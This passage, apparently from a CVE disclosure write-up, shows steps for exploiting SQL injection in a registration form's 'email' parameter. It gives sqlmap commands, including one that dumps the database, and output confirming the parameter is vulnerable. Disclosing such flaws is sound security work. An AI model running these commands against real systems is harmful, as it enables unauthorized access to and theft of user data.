![notepad](https://github.com/gurudattch/CVEs/blob/main/assets/5.png)

6. Now Run **sqlmap** on this request 

`sqlmap -r register_req.txt -p email`

__dump database;__

`sqlmap -r register_req.txt -p email --dump`

```
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
